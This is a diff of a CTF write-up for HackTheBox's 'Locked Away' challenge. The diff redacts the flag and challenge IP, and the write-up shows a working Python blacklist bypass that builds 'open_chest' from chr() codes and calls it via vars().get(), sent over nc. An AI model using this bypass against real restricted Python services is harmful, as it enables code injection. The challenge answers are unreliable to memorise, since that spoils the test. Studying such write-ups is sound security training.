@@ -8,7 +8,7 @@
 
 **Keywords:** python sandbox escape, chr() bypass, vars().get(), blacklist bypass, code injection, restricted shell, exec, python jail, character code construction, open_chest, dictionary methods, introspection bypass, misc easy 975 points  
 **Tags:** #python #sandbox #blacklist-bypass #chr #vars #exec #jailbreak #misc-easy #hackthebox #ctf  
-**Flag:** `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_6e18b179e97f616ccb44d71e361278de}`  
+**Flag:** `HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}`  
 **Search Terms:** how to bypass python blacklist, python sandbox escape chr, python vars get bypass, restricted python shell escape, python exec bypass, open_chest function call, hackthebox locked away walkthrough, hackthebox locked away solution, lockedaway htb, locked-away ctf
 
 - **Name**: Locked Away
@@ -23,7 +23,7 @@ A test! Getting onto the team is one thing, but you must prove your skills to be
 
 ## Target Information
 
-- **IP**: 154.57.164.82
+- **IP**: <CHALLENGE_IP>
 - **Port**: 32011
 - **Type**: Python Sandbox Escape
 
@@ -88,16 +88,16 @@ vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)
 ### Payload
 
 ```bash
-$ nc 154.57.164.82 32011
+$ nc <CHALLENGE_IP> 32011
 [banner displayed]
 The chest lies waiting... vars().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
-HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_6e18b179e97f616ccb44d71e361278de}
+HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}
 ```
 
 ## Flag
 
 ```
-HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_6e18b179e97f616ccb44d71e361278de}
+HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_████████████████████████████████}
 ```
 
 ## Key Takeaways
